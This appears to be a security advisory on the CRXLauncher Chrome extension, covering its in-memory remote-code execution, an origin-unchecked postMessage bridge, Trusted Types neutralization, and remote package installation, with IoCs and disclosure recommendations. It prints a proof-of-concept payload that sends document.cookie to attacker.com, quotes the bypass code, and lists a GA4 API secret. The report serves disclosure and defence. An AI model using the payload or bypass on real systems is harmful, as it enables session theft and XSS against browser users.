# The Million-Node Extension Dropper

## CRXLauncher: Manifest V3 Bypass and PostMessage Privilege Escalation

**Author:** Independent Security Research Team  
**Date:** October 20, 2026  
**Target:** CRXLauncher Chrome Extension (`kiilhncajadbgbmdbdcopdpnmdhlbdle`)  
**Target Infrastructure:** `crxlauncher.com`  
**Classification:** Critical Security Advisory / Threat Intel Whitepaper  

---

## Executive Summary

**CRXLauncher** is a Google Chrome extension currently distributed via the
official Chrome Web Store with over **1,000,000 active installations** and an
ostensibly benign 4.9-star rating. While advertised to consumers and developers
as a frictionless utility for loading unpacked `.crx` files without enabling
Developer Mode, comprehensive reverse engineering of version 1.1.0 reveals that
the extension is a sophisticated **in-browser virtual machine, dynamic dropper,
and adware delivery framework**.

The extension systematically circumvents the foundational security model of
Google Chrome's **Manifest V3 (MV3)**—specifically the prohibition on Remotely
Hosted Code—by constructing an internal multi-tiered execution environment. It
dynamically fetches arbitrary `.crx` or `.zip` archives from remote servers,
decompresses them in memory using bundled JSZip, stores them in
`chrome.storage.local`, and executes arbitrary guest JavaScript inside a
sandboxed iframe within an offscreen document via `new Function()`.

Critically, this research has uncovered **multiple high-severity security
vulnerabilities** that compromise all 1,000,000+ hosts running the extension:

1. **Zero-Day Remote Privilege Escalation via `window.postMessage` (`CVSS 9.6 -
   Critical`):** An isolated-world bridge script (`assets/js/brg.js`), injected
   into every frame of every HTTP/HTTPS website visited by the victim, listens
   for window messages without validating the message origin (`event.origin`).
   Any malicious web page visited by the victim can send cross-origin messages
   to invoke privileged Chrome extension APIs, including arbitrary script
   execution across other browser tabs (`scripting.executeScript`), arbitrary
   file downloads (`downloads.download`), and storage manipulation.
2. **Global Neutralization of W3C Trusted Types (`CVSS 7.5 - High`):** The
   extension automatically injects `assets/js/vendor.js` into the `MAIN`
   execution world of every website visited at `document_start`. This script
   forcefully monkey-patches `window.trustedTypes.createPolicy` to inject an
   insecure default pass-through policy, stripping DOM Cross-Site Scripting (DOM
   XSS) protections from every website the user visits (including online
   banking, enterprise portals, and Google services).
3. **Remote Dropper / Supply Chain Attack Vector:** Under `manifest.json`'s
   `externally_connectable` configuration, the external domain
   `https://crxlauncher.com/*` has unauthenticated remote authority to trigger
   silent downloads and installations of arbitrary secondary extension packages
   without cryptographic signature or hash verification.
4. **Massive Adware / Fraud Syndicate Tie-In:** Corroborated by global threat
   intelligence telemetry, CRXLauncher is distributed as a forced installation
   gatekeeper on major warez and software distribution hubs (notably
   **FileCR**), acting as an unvetted pipeline to inject affiliate link
   hijacking, cookie stuffing, and search redirection scripts.

---

## 1. Threat Landscape & Victimology Metrics

### 1.1 Installation Metrics & Market Penetration

Data extracted directly from Google Chrome Web Store endpoint metadata:

- **Chrome Web Store ID:** `kiilhncajadbgbmdbdcopdpnmdhlbdle`
- **Active Installs:** **1,000,000+ users**
- **Average Rating:** 4.9 / 5.0 (frequently inflated through syndication)
- **Manifest Version:** 3 (Target Chromium >= 120)
- **Last Store Update:** August 14, 2026

### 1.2 Distribution Mechanism

The primary infection vector is **coercive and deceptive bundling**:

- High-traffic download portals (most prominently **FileCR**, a site generating
  tens of millions of visits monthly) intercept user download requests for
  freeware, torrents, or utilities.
- Users are instructed that downloading their requested software requires
  installing "CRXLauncher" to facilitate extension management or bypass browser
  warnings.
- The web endpoint `https://crxlauncher.com/download` serves an HTTP 302
  redirect directly to the official Chrome Web Store URL
  (`https://chromewebstore.google.com/detail/kiilhncajadbgbmdbdcopdpnmdhlbdle`),
  lending an aura of Google-sanctioned legitimacy to the attack chain.

---

## 2. Technical Architecture & Manifest V3 Evasion

Google introduced Manifest V3 with a primary objective: eliminate remotely
hosted code to prevent extensions from mutating into malicious droppers
post-review. CRXLauncher completely bypasses this guarantee by implementing a
custom Chrome Extension Virtual Machine (CEVM).

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        REMOTE C2 INFRASTRUCTURE                        │
│                           crxlauncher.com                              │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │ (externally_connectable: install)
                                     ▼
┌────────────────────────────────────────────────────────────────────────┐
│                   BACKGROUND SERVICE WORKER (bg.js)                    │
│ ┌────────────────────────────────────────────────────────────────────┐ │
│ │ Engine (module_9030.js)                                            │ │
│ │  - Fetches remote archive (downloadUrl / updateUrl)                │ │
│ │  - Decompresses via JSZip (module_9001.js)                         │ │
│ │  - Serializes files to chrome.storage.local                        │ │
│ └──────────────────────────────────┬─────────────────────────────────┘ │
│                                    │ Spawns offscreen document         │
│                                    ▼                                   │
│ ┌────────────────────────────────────────────────────────────────────┐ │
│ │ Offscreen Document: offscr.html (Reason: IFRAME_SCRIPTING)         │ │
│ │  - Hosts Sandboxed Iframe (sb.html)                                │ │
│ │  - XHR Proxy Tunnel (module_4182.js)                               │ │
│ │  - Sandboxed execution via `new Function(code)()`                  │ │
│ └──────────────────────────────────┬─────────────────────────────────┘ │
└────────────────────────────────────┼───────────────────────────────────┘
                                     │ chrome.scripting.registerContentScripts
                                     │ Matches: http://*/*, https://*/* (allFrames)
                                     ▼
┌────────────────────────────────────────────────────────────────────────┐
│                     TARGET BROWSER TABS & FRAMES                       │
│ ┌─────────────────────────┐                 ┌────────────────────────┐ │
│ │       MAIN WORLD        │                 │     ISOLATED WORLD     │ │
│ │ ─────────────────────── │                 │ ────────────────────── │ │
│ │ vendor.js:              │                 │ brg.js:                │ │
│ │  - Neutralizes W3C      │                 │  - Message tunnel      │ │
│ │    Trusted Types        │  postMessage    │  - Unauthenticated     │ │
│ │ content.js:             │◄───────────────►│    "chrome: call       │ │
│ │  - Injects cl_chrome    │  (NO ORIGIN     │     method" API proxy  │ │
│ │  - Runs guest payload   │   VALIDATION)   │  - Connects to native  │ │
│ │    in page DOM          │                 │    chrome.* APIs       │ │
│ └─────────────────────────┘                 └────────────────────────┘ │
└────────────────────────────────────────────────────────────────────────┘
```

### 2.1 Dynamic Payload Acquisition and Decompression

When triggered by the C2 or local configuration, the extension initiates
`installFromUrl()` in `module_6131.js`:

```javascript
const m = await a.A.download(o, p);      // Fetches remote ZIP/CRX
this.files = await a.A.extract(m);      // Decompresses archive via JSZip
await l.A.local.set(s.d.local.app.files, this.files); // Stores in chrome.storage.local
```

The internal compiler (`module_296.js`, class `h`) parses `manifest.json`,
locales, options, popup, side panel, and content scripts directly from the
unpacked data, completely reconstructing a functional guest extension in memory.

### 2.2 Offscreen Sandbox Execution (`new Function()`)

Because Service Workers in MV3 enforce a strict Content Security Policy
forbidding `eval()`, CRXLauncher calls `chrome.offscreen.createDocument()` with
reason `IFRAME_SCRIPTING`, rendering
[offscr.html](file:///d:/CRXLauncher/offscr.html), which loads
[sb.html](file:///d:/CRXLauncher/sb.html) in an iframe sandbox.

In [assets/js/sb.js](file:///d:/CRXLauncher/assets/js/sb.js#L1146-L1155), the
background script of the downloaded guest package is executed:

```javascript
if (void 0 !== a.js) {
    try {
        new Function(a.js)();
    } catch (e) {
        r(e.message);
    }
}
```

### 2.3 Network Tunneling (XHR Virtualization)

Guest extensions executing within `sb.html` cannot make standard cross-origin
network requests due to iframe sandbox restrictions. CRXLauncher overcomes this
by overriding `window.XMLHttpRequest` inside the sandbox
([assets/js/sb.js](file:///d:/CRXLauncher/assets/js/sb.js#L760-L845)) and
proxying request parameters (`url`, `method`, `headers`, `body`) via `xhr: send`
to [assets/js/offscr.js](file:///d:/CRXLauncher/assets/js/offscr.js#L1-L40)
(`module_4182.js`). The offscreen document then dispatches authentic browser
HTTP requests leveraging the extension's broad host permissions and cookie jar.

---

## 3. Vulnerability Analysis & Exploitation Vectors

### 3.1 VULN-1: Zero-Day Remote Privilege Escalation via Unauthenticated `postMessage`

- **Identifier:** CRX-0DAY-2026-01
- **Severity:** Critical (CVSS 3.1: 9.6 /
  `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`)
- **Vulnerable File:** `assets/js/brg.js` (Lines 1749-1810, 1872-1912)

#### Vulnerability Description

CRXLauncher injects `brg.js` into the `ISOLATED` world of all web pages visited
by the user (`http://*/*` and `https://*/*`, `allFrames: true`). To enable
communication between the page and extension background, `brg.js` instantiates a
window message dispatcher (Class `T`):

```javascript
// assets/js/brg.js, Line 1874
window.addEventListener("message", (t) => {
    if (t.data.namespace !== this.NAMESPACE) return;
    const { type: n } = t.data;
    if ("message" === n && t.data.target === e) {
        this.handleMessage(t.data);
    }
});
```

When handling incoming messages with name `"chrome: call method"`, `brg.js` maps
the requested path directly to the browser's native `chrome.*` namespace:

```javascript
// assets/js/brg.js, Line 1776
e.on("chrome: call method", async ({ path: e, args: r, hasCallback: n }) => {
    r = E.transformArgs(e, r, t);
    e = E.transformPath(e);
    const i = _(e); // Dynamically resolves window.chrome[e]
    return new Promise((t) => {
        let s = i(...r);
        t({ result: S.transform(e, s) });
    });
});
```

#### Flaw Mechanics

There is **zero validation of `event.origin` or `event.source`**. Any arbitrary
website loaded in any browser tab or iframe can emit a `window.postMessage`
formatted with `namespace: "__crxlauncher_window_communication"` and execute
privileged extension APIs.

#### Weaponization Scenario

A malicious site visited by an affected user can dispatch the following payload
to inject arbitrary JavaScript into any other open tab (e.g., active web banking
or email sessions):

```html
<script>
// Exploit PoC: Universal Tab Script Injection via CRXLauncher Bridge
window.postMessage({
    namespace: "__crxlauncher_window_communication",
    target: "content/bridge",
    type: "message",
    name: "chrome: call method",
    uuid: "exploit-uuid-1",
    data: {
        path: "tabs.executeScript",
        args: [
            victimTabId,
            { code: "fetch('https://attacker.com/steal?c=' +
                     encodeURIComponent(document.cookie));" }
        ],
        hasCallback: true
    }
}, "*");
</script>
```

Because `tabs.executeScript` is transformed internally into
`scripting.executeScript` running with `world: "MAIN"`, the injected script
bypasses site isolation, executing in the context of the target victim origin.

Furthermore, attackers can trigger silent background downloads to disk
(`downloads.download`) or exfiltrate extension storage keys.

---

### 3.2 VULN-2: Universal W3C Trusted Types Neutralization

- **Identifier:** CRX-VULN-2026-02
- **Severity:** High (CVSS 3.1: 7.5 /
  `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
- **Vulnerable File:** `assets/js/vendor.js` (`module_4827`)

#### Vulnerability Description (VULN-2)

W3C Trusted Types is a critical modern browser defense designed to eliminate
Client-Side DOM XSS by requiring string sanitization before writing to sinks
like `innerHTML`, `script.src`, or `eval()`.

CRXLauncher injects `vendor.js` into the `MAIN` world at `document_start` on
every visited site. To facilitate its own unsanitized script generation, it
installs an intentional bypass policy:

```javascript
// assets/js/vendor.js, Line 1 (module 4827)
const e = window.trustedTypes?.createPolicy;
let t;
try {
    t = window.trustedTypes?.createPolicy("default", {
        createHTML: e => e,
        createScript: e => e,
        createScriptURL: e => e
    });
} catch {
    t = void 0;
}
window.trustedTypes && e && (window.trustedTypes.createPolicy = function(...n) {
    return "default" === n[0] && t ? t : e.apply(window.trustedTypes, n);
});
```

#### Security Impact

By intercepting and neutralizing the `"default"` Trusted Types policy, the
extension effectively disables DOM XSS defenses for **all websites loaded by the
1,000,000+ users**. Applications that rely on Trusted Types as their primary
defense against DOM XSS are rendered completely vulnerable to injection attacks.

---

### 3.3 VULN-3: Arbitrary External Package Installation via `externally_connectable`

- **Identifier:** CRX-VULN-2026-03
- **Severity:** High (CVSS 3.1: 8.8 /
  `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
- **Vulnerable File:** `manifest.json` (Line 12) & `assets/js/bg.js`
  (`module_4474.js`)

In `manifest.json`, the extension declares:

```json
"externally_connectable": {
    "matches": [ "https://crxlauncher.com/*" ]
}
```

In `module_4474.js`:

```javascript
chrome.runtime.onMessageExternal.addListener((async (e, t) => {
    const { action: n } = e;
    if ("install" === n) {
        const { appId: n, downloadUrl: o, updateUrl: c,
                name: l, iconUrl: u } = e.data;
        let d = `${optUrl}?app_id=${encodeURIComponent(n)}&download_url=${encodeURIComponent(o)}`;
        if (c) d += `&update_url=${encodeURIComponent(c)}`;
        await chrome.tabs.update(t.tab?.id, { url: d });
    }
}));
```

#### Security Impact (VULN-3)

Any Cross-Site Scripting (XSS) vulnerability, sub-domain takeover, or DNS
hijacking targeting `crxlauncher.com` empowers remote adversaries to instruct
every installed client extension to fetch, decompress, and execute arbitrary
malicious CRX/ZIP code without Chrome Web Store intervention.

---

### 3.4 VULN-4: Covert Telemetry & Hostname Exfiltration

- **Vulnerable File:** `assets/js/bg.js` (`module_963.js`)

The extension communicates with Google Analytics 4 via the Measurement Protocol:

- **Endpoint:** `https://www.google-analytics.com/mp/collect`
- **Measurement ID:** `G-Z14126F651`
- **API Secret:** `NqpDuhxQTVSqAVkEgU4nPQ`

The telemetry pipeline assigns a persistent UUID (`crxlauncher__uuid`),
generates session tokens, tracks extension lifecycles (`installed`, `updated`),
and captures error events (`extension_error`). Crucially, when scripts fail
across injected websites, the client automatically extracts and transmits
`window.location.hostname`, exfiltrating the victim's web browsing activity to
remote servers in violation of the Chrome Web Store's declared "No tracking"
policy.

---

## 4. Infrastructure & C2 Reconnaissance

| Dimension | Details | Security Assessment |
| :--- | :--- | :--- |
| **Domain** | `crxlauncher.com` / `www.crxlauncher.com` | Registered 2025-06-03, Expires 2027-06-03 |
| **Registrar** | NameCheap, Inc. | Identity redacted via *Withheld for Privacy* |
| **Edge CDN** | Cloudflare Anycast (AS13335) | IPs: `104.21.86.100`, `172.67.217.211` |
| **TLS Configuration** | TLS 1.3 (`TLS_AES_256_GCM_SHA384`) | Google Trust Services (`WE1`), Wildcard `*.crxlauncher.com` |
| **Mail Services** | Zoho Mail (`mx.zoho.com`) | SPF configured, DMARC enforced (`p=reject`) |
| **Backend Stack** | Node.js + Express.js + Helmet | Identified via strict response header fingerprinting |
| **Cloaking Behavior** | `/download` endpoint | Issues HTTP 302 redirect directly to Google Web Store |
| **Crawler Evasion** | `/robots.txt` | Custom Directive invoking EU Copyright Dir. 2019/790 to repel AI bots |

---

## 5. Indicators of Compromise (IoCs)

### 5.1 Extension Artifacts

- **Extension ID:** `kiilhncajadbgbmdbdcopdpnmdhlbdle`
- **Version:** `1.1.0`
- **Public Key Hash (SHA-256):**
  `9bf7ebc815349e5d4cb0d829391ab1a1ea1d07c08deea2cb6962cf75f32a0c64`

### 5.2 Network Indicators

- **C2 Domain:** `crxlauncher.com`
- **Subdomains:** `www.crxlauncher.com`
- **Associated IP Addresses (Cloudflare Anycast):**
  - `104.21.86.100`
  - `172.67.217.211`
  - `2606:4700:3034::ac43:d9d3`
  - `2606:4700:3032::6815:5664`
- **Google Analytics Tracking ID:** `G-Z14126F651`
- **GA4 API Secret:** `NqpDuhxQTVSqAVkEgU4nPQ`

### 5.3 Host Artifacts (Local Storage Keys)

- `crxlauncher__uuid`
- `crxlauncher__app-data`
- `crxlauncher__app-files`
- `crxlauncher__compiled-data`
- `crxlauncher__ga4-events`
- `__crxlauncher_runtime_message__` (window namespace)
- `__crxlauncher_window_communication` (window namespace)

---

## 6. Recommendations & Coordinated Disclosure

### For Google Chrome Trust & Safety Team

1. **Immediate Revocation:** Immediately delist extension
   `kiilhncajadbgbmdbdcopdpnmdhlbdle` from the Chrome Web Store and trigger
   remote disablement on all 1,000,000+ client browsers.
2. **Review Pipeline Hardening:** Implement automated static detection for
   in-memory JSZip extraction coupled with offscreen `new Function()` evaluation
   within Manifest V3 submission pipelines.
3. **Audit Offscreen `IFRAME_SCRIPTING` Usage:** Restrict or require elevated
   justification for `chrome.offscreen` contexts that spawn `sandbox` iframes
   with subsequent dynamic code generation.

### For Enterprise SOCs and Security Administrators

1. **Block Extension ID:** Add `kiilhncajadbgbmdbdcopdpnmdhlbdle` to the
   enterprise Chromium ExtensionInstallBlocklist via Group Policy / MDM.
2. **Network Perimeter Blocking:** Block egress traffic to `crxlauncher.com` and
   monitor proxy logs for referrers containing `crxlauncher.com/welcome`.
3. **Session Invalidation:** Prompt users with identified active installations
   to terminate active browser sessions and rotate session tokens, as the
   unauthenticated `postMessage` backdoor exposes all concurrent browser
   contexts.

---
*Report generated and validated via static reverse engineering, dynamic code
flow analysis, and live network reconnaissance.*
